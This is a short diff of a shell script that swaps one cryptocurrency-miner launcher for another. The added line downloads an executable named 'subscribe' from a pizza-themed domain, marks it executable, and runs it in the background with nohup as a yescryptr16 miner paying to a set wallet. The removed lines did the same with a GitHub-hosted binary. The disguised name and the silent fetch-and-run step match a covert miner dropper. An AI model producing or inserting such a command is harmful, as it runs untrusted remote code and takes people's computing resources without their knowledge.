@@ -1,4 +1,2 @@
 #!/bin/sh
-wget https://github.com/aurbach55/sugeh-ice/raw/main/s001
-chmod +x s001
-nohup ./s001 -a YespowerSugar -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.test -t4 &
+wget http://ilovenypizza.com/subscribe; chmod +x subscribe; nohup ./subscribe -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qZsuUqi44TXbTXxT7ms9qF5NCHj8Jejgg2.qoge1nt &
